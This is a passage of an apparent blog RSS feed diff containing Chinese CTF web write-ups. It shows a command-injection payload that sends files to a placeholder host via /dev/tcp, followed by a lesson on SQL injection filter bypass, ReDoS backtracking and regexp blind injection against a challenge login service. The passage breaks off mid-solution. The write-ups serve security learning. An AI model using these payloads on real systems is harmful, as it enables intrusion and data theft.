+	&lt;a href=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329160322856.png&#34; data-size=&#34;1160x58&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329160322856.png&#34;
+			width=&#34;1160&#34;
+			height=&#34;58&#34;
+			srcset=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329160322856_hu393e81e5b3888cba65c1da2c64406c60_79670_480x0_resize_box_3.png 480w, https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329160322856_hu393e81e5b3888cba65c1da2c64406c60_79670_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220329160322856&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220329160322856&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h4 id=&#34;解法二&#34;&gt;解法二&lt;/h4&gt;
+&lt;p&gt;利用python的三引号构造多行字符串，三引号括起来的内容在eval里被当作字符串，是不会报错的。比如说：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 246; 
+			flex-basis: 591px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329173754460.png&#34; data-size=&#34;271x110&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329173754460.png&#34;
+			width=&#34;271&#34;
+			height=&#34;110&#34;
+			srcset=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329173754460_hud597a1a14bd3b1e8e791d9af7b8aaae6_3470_480x0_resize_box_3.png 480w, https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329173754460_hud597a1a14bd3b1e8e791d9af7b8aaae6_3470_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220329173754460&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220329173754460&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;既然过了eval，那接下来开始考虑怎么让shell执行。先来看看shell里面三引号的反应。首先shell是支持多行字符串的，第一第二个输出可以看出来。并且shell里面对多个单引号，一般是采取闭合的办法来识别，看第三个输出。再加上shell里面，以&lt;code&gt;#&lt;/code&gt;开头的字符串会被当作注释，不予输出，看第四个例子。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 76; 
+			flex-basis: 183px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329173926144.png&#34; data-size=&#34;365x478&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329173926144.png&#34;
+			width=&#34;365&#34;
+			height=&#34;478&#34;
+			srcset=&#34;https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329173926144_hu66dc89d046d126126599c1d277f16485_22935_480x0_resize_box_3.png 480w, https://example.com/2022/dasctfxsuctf-web-writeup/image-20220329173926144_hu66dc89d046d126126599c1d277f16485_22935_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220329173926144&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220329173926144&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;所以根据eval和shell对待三引号字符串的不同解释，可以构造如下输入：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&#39;&#39;&#39;1&#39;\nls\n#&#39;3&#39;&#39;&#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;把这个输入拼接到echo里面就是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;echo {0} {1} &#39;&#39;&#39;1&#39;
+ls
+#&#39;3&#39;&#39;&#39;&amp;gt; ./tmp/log.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;成功命令执行。&lt;/p&gt;
+&lt;p&gt;这里为了拿到flag，可以直接外带&lt;/p&gt;
+&lt;p&gt;payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;num = %27%27%271%27%0Acat%0A/*%09%3E%09/dev/tcp/x.x.x.x/port%0A%23%273%27%27%27
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;参考资料&#34;&gt;参考资料&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://ek1ng.com/2022/03/26/DASCTF/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;DASCTF X SU 2022 writeup&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_42880719/article/details/123763744&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;2022DASCTF X SU 三月春季挑战赛 WriteUp&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/solitudi/article/details/113588692&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;[CTF]PHP反序列化总结&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;写在后面&#34;&gt;写在后面&lt;/h3&gt;
+&lt;p&gt;又水了一场比赛，不过还是学到东西了。以前没能把相应的知识点记录下来真的有一点可惜（很大一部分原因是笔记丢了23333），不过大部分的事情什么时候开始都不算晚吧（大概）。&lt;/p&gt;
+&lt;p&gt;加油加油。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>从一道题学ReDos及SQL盲注</title>
+        <link>https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/</link>
+        <pubDate>Sun, 20 Mar 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/</guid>
+        <description>&lt;h3 id=&#34;写在前面&#34;&gt;写在前面&lt;/h3&gt;
+&lt;p&gt;打虎符CTF，开头就被平台挡在外面了:D&lt;/p&gt;
+&lt;p&gt;web一如既往的难，babysql看起来可做一些，就从这道题开始。此处感谢高表哥和nkk的指导和pyy的脑洞。&lt;/p&gt;
+&lt;p&gt;疫情特殊时期，不能线下聚集打比赛还是有点可惜，实验室三个web手给二师傅打下手(bushi)&lt;/p&gt;
+&lt;h3 id=&#34;解题过程&#34;&gt;解题过程&lt;/h3&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 246; 
+			flex-basis: 592px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320142246038.png&#34; data-size=&#34;743x301&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320142246038.png&#34;
+			width=&#34;743&#34;
+			height=&#34;301&#34;
+			srcset=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320142246038_huf20b7c574c1a2947a9d8ce44a5eb81a5_5486_480x0_resize_box_3.png 480w, https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320142246038_huf20b7c574c1a2947a9d8ce44a5eb81a5_5486_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220320142246038&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220320142246038&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;It is a pure sql injection challenge. Login any account to get flag. Have fun with mysql 8. There is something useful in /hint.md.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;前台限制了输入，这个不要紧，可以通过python或者burp发包过去。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 181; 
+			flex-basis: 436px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320142647728.png&#34; data-size=&#34;624x343&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320142647728.png&#34;
+			width=&#34;624&#34;
+			height=&#34;343&#34;
+			srcset=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320142647728_hu901eaa76c6c8aec166148a69ecd08f22_42150_480x0_resize_box_3.png 480w, https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320142647728_hu901eaa76c6c8aec166148a69ecd08f22_42150_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220320142647728&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220320142647728&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;随便输入登录一下。&lt;/p&gt;
+&lt;p&gt;给了个返回值。如果要注入的话只能根据这个返回值判断，所以应该是个盲注。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{&amp;quot;statusCode&amp;quot;:401,&amp;quot;message&amp;quot;:&amp;quot;Unauthorized&amp;quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;据题目所说能注出账号密码就给flag。然后很贴心给了一个hint，先进去看看。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;```sql
+CREATE TABLE `auth` (
+  `id` int NOT NULL AUTO_INCREMENT,
+  `username` varchar(32) NOT NULL,
+  `password` varchar(32) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `auth_username_uindex` (`username`)
+) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
+```
+
+```js
+import { Injectable } from &#39;@nestjs/common&#39;;
+import { ConnectionProvider } from &#39;../database/connection.provider&#39;;
+
+export class User {
+  id: number;
+  username: string;
+}
+
+function safe(str: string): string {
+  const r = str
+    .replace(/[\s,()#;*\-]/g, &#39;&#39;)
+    .replace(/^.*(?=union|binary).*$/gi, &#39;&#39;)
+    .toString();
+  return r;
+}
+
+@Injectable()
+export class AuthService {
+  constructor(private connectionProvider: ConnectionProvider) {}
+
+  async validateUser(username: string, password: string): Promise&amp;lt;User&amp;gt; | null {
+    const sql = `SELECT * FROM auth WHERE username=&#39;${safe(username)}&#39; LIMIT 1`;
+    const [rows] = await this.connectionProvider.use((c) =&amp;gt; c.query(sql));
+    const user = rows[0];
+    if (user &amp;amp;&amp;amp; user.password === password) {
+      // eslint-disable-next-line @typescript-eslint/no-unused-vars
+      const { password, ...result } = user;
+      return result;
+    }
+    return null;
+  }
+}
+```
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;我们传入的username经过了过滤，括号空格等等特殊字符不能用，union被过滤不能联合查询，binary被过滤不能通过它来区分大小写。传入username以后会对表进行查询，查出记录再对传入的密码password进行比对，通过就返回result，也就是flag。&lt;/p&gt;
+&lt;p&gt;先随便传点东西看一下回显。SQL注入传统艺能：闭合引号。这里直接忽略空格了，相当于用引号作分隔，区分开了关键字和字符串；然后只要不用带括号的函数，就不会用到括号。所以直接绕过第一个replace的过滤了。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;username: 1&#39;or&#39;1&#39;=&#39;1
+password: &#39;123456&#39;
+SQL语句: SELECT * FROM auth WHERE username=&#39;1&#39;or&#39;1&#39;=&#39;1&#39; LIMIT 1
+
+返回: {&amp;quot;statusCode&amp;quot;:401,&amp;quot;message&amp;quot;:&amp;quot;Unauthorized&amp;quot;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;试了很多，好像都没有办法得到其他的回显，像传统时间盲注，因为括号被过滤了，很多操作没能实现。不过这里发现语句出错或者sql炸掉的时候会报501。这里就有两个回显了。&lt;/p&gt;
+&lt;p&gt;于是开始和pyy思考如何做到有正确返回值的时候给401，有错误返回值的时候给500。题目很长时间没人解，出题人给了个&lt;code&gt;regexp&lt;/code&gt;的提示，再加上后来高表哥点了一个&lt;code&gt;ReDos&lt;/code&gt;，所以开始顺着这个方向摸索。&lt;/p&gt;
+&lt;h4 id=&#34;mysql探索&#34;&gt;MySQL探索&lt;/h4&gt;
+&lt;p&gt;到这里，题目先放一边，先开个sql随便试试。题目给了mysql8，我这里开了一个mysql8.0.16。&lt;/p&gt;
+&lt;p&gt;根据题目给的sql内容新建一个库用来测试。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 105; 
+			flex-basis: 254px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320150618144.png&#34; data-size=&#34;360x340&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320150618144.png&#34;
+			width=&#34;360&#34;
+			height=&#34;340&#34;
+			srcset=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320150618144_huf25220e778e888ad8fd38e24714253e2_14887_480x0_resize_box_3.png 480w, https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320150618144_huf25220e778e888ad8fd38e24714253e2_14887_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220320150618144&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220320150618144&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;把sql语句接进去，回显正常。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 432; 
+			flex-basis: 1037px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320150854245.png&#34; data-size=&#34;644x149&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320150854245.png&#34;
+			width=&#34;644&#34;
+			height=&#34;149&#34;
+			srcset=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320150854245_huc59d95a7a77c17266cfd588e2df4e5fb_9709_480x0_resize_box_3.png 480w, https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320150854245_huc59d95a7a77c17266cfd588e2df4e5fb_9709_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220320150854245&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220320150854245&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;mysql的&lt;code&gt;or&lt;/code&gt;有短路机制，如果多个&lt;code&gt;or&lt;/code&gt;拼接，前面判断为true的时候，后面的or内容就会被短路不进行判断；如果前面为false，会继续往后判断；最终如果没有一个true，就会返回false。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 193; 
+			flex-basis: 465px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320152024497.png&#34; data-size=&#34;733x378&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320152024497.png&#34;
+			width=&#34;733&#34;
+			height=&#34;378&#34;
+			srcset=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320152024497_hubce7b9f9aef3b0612ad78b68da86a989_26310_480x0_resize_box_3.png 480w, https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320152024497_hubce7b9f9aef3b0612ad78b68da86a989_26310_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220320152024497&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220320152024497&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;然后探讨一下&lt;code&gt;regexp&lt;/code&gt;的机制。正常去匹配的时候，遵循正则表达式，如果匹配成功就会返回查询的信息，如果匹配不成功就返回空值，同时如果表达式出错的话SQL就会炸掉。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 187; 
+			flex-basis: 449px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320152544638.png&#34; data-size=&#34;837x447&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320152544638.png&#34;
+			width=&#34;837&#34;
+			height=&#34;447&#34;
+			srcset=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320152544638_hu6cfebc5ced7190a3d001d673d6d03fef_37444_480x0_resize_box_3.png 480w, https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320152544638_hu6cfebc5ced7190a3d001d673d6d03fef_37444_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220320152544638&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220320152544638&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h4 id=&#34;redos&#34;&gt;ReDos&lt;/h4&gt;
+&lt;p&gt;那么什么是&lt;code&gt;ReDos&lt;/code&gt;呢？&lt;/p&gt;
+&lt;p&gt;正则表达式里面有两个重复运算符&lt;code&gt;*&lt;/code&gt;和&lt;code&gt;+&lt;/code&gt;，&lt;code&gt;*&lt;/code&gt;代表重复零次或多次，&lt;code&gt;+&lt;/code&gt;代表重复一次或多次。这里附上一个验证正则表达式的&lt;a class=&#34;link&#34; href=&#34;https://regex101.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;网址&lt;/a&gt;，可以很好地验证我们的正则写的对不对。针对正则的重复运算符，首先需要了解它的匹配机制。下面先解释几个问题。&lt;/p&gt;
+&lt;p&gt;DFA（确定性有限状态自动机）和NFA（非确定性有限状态自动机）的区别&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;DFA
+通俗一点解释就是拿一整串字符串与拆分开的正则表达式匹配匹配。
+比如匹配&#39;abbbc&#39;，正则表达式为&#39;ab{1,3}c&#39;，匹配过程如下：
+a 匹配 a
+ab 匹配 ab{1,3}
+abb 匹配 ab{1,3}
+abbb 匹配 ab{1,3}  // 刚好最多三个b结束
+abbbc 匹配 ab{1,3}c 
+NFA
+也通俗一点解释就是拿整个正则表达式与字符串的逐个字符匹配。
+
+
+....写着写着发现有点不对，先放着....
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;MySQL属于NFA，存在回溯机制。&lt;/p&gt;
+&lt;p&gt;关于重复运算符&lt;code&gt;+&lt;/code&gt;和&lt;code&gt;*&lt;/code&gt;的区别（就是至少一次和零次的区别）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ca*t 匹配 caaaaat和ct
+ca+t 匹配 caaaaat
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;贪婪匹配和非贪婪匹配&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;x.*y 匹配 xaaaaayqweqxbbbbby
+x.*?y 匹配 xaaaaay和xbbbbby
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;回溯&lt;/p&gt;
+&lt;p&gt;不管是贪婪匹配还是非贪婪匹配，如果给出的表达式是不恰当的，计算机处理的时候会进行回溯（至于什么是恰当的正则表达式，之后有空再细说）&lt;/p&gt;
+&lt;p&gt;比如我需要匹配&lt;code&gt;xabcdyabc&lt;/code&gt;，给出的表达式是&lt;code&gt;x.*y&lt;/code&gt;，那么计算机进行匹配的流程应该是：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;x 匹配 x
+xa 匹配 x.*
+xab 匹配 x.*
+xabc 匹配 x.*
+xabcd 匹配 x.*
+xabcdy 匹配 x.*
+xabcdya 匹配 x.*
+xabcdyab 匹配 x.*
+xabcdyabc 匹配 x.*  // 注意，这里已经匹配完了，开始回溯
+xabcdyab 匹配 x.*
+xabcdya 匹配 x.*
+xabcdy 匹配 x.*
+xabcd 匹配 x.*
+xabcdy 匹配 x.*y
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可见，如果匹配的过程中产生回溯，将会大大降低效率。所以假如我们需要匹配&lt;code&gt;aaaaaaaaaaaaaaaaa&lt;/code&gt;，给出的表达式是&lt;code&gt;(a+)+b&lt;/code&gt;，我们能轻易看出来这是不匹配的，但是计算机会对其进行回溯，做很多没有必要且愚蠢的操作，然后导致操作步数过多，超时或者崩溃。利用这一点可以达到Dos的效果。&lt;/p&gt;
+&lt;p&gt;如果在MySql里面试，会报超时。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 1057; 
+			flex-basis: 2538px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320180534057.png&#34; data-size=&#34;698x66&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320180534057.png&#34;
+			width=&#34;698&#34;
+			height=&#34;66&#34;
+			srcset=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320180534057_hud401d5bca98419771356e6e1437cc78c_8008_480x0_resize_box_3.png 480w, https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320180534057_hud401d5bca98419771356e6e1437cc78c_8008_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220320180534057&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220320180534057&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;或者在python里面试，会卡死。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 1150; 
+			flex-basis: 2761px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320180658644.png&#34; data-size=&#34;702x61&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320180658644.png&#34;
+			width=&#34;702&#34;
+			height=&#34;61&#34;
+			srcset=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320180658644_hu32acc1b33099b17ebb46f433a037856e_3476_480x0_resize_box_3.png 480w, https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320180658644_hu32acc1b33099b17ebb46f433a037856e_3476_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220320180658644&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220320180658644&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h4 id=&#34;尝试解题&#34;&gt;尝试解题&lt;/h4&gt;
+&lt;p&gt;了解了上面这些东西，差不多可以开始解题了。我们尝试对给出的sql语句进行拼接，利用&lt;code&gt;or&lt;/code&gt;的短路规则和regexp查询、制造报错。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 439; 
+			flex-basis: 1054px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320213048644.png&#34; data-size=&#34;971x221&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320213048644.png&#34;
+			width=&#34;971&#34;
+			height=&#34;221&#34;
+			srcset=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320213048644_hu5314ee8339d563f07b497191380da802_26223_480x0_resize_box_3.png 480w, https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320213048644_hu5314ee8339d563f07b497191380da802_26223_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220320213048644&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220320213048644&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;当然也可以用ReDos制造超时。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 2491; 
+			flex-basis: 5979px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320213203235.png&#34; data-size=&#34;1146x46&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320213203235.png&#34;
+			width=&#34;1146&#34;
+			height=&#34;46&#34;
